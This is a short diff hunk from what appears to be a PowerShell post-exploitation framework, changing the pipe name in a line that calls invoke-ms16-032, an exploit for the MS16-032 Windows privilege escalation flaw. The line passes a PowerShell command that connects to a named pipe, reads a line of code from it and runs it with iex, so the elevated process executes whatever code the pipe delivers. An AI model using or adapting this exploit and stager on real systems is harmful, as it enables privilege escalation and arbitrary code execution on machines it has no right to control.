@@ -2655,7 +2655,7 @@ Function Main
 
 Main
 }
-invoke-ms16-032 "powershell -c `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
+invoke-ms16-032 "powershell -c `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMS'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
 }
 
 start-job -ScriptBlock $scriptblock 
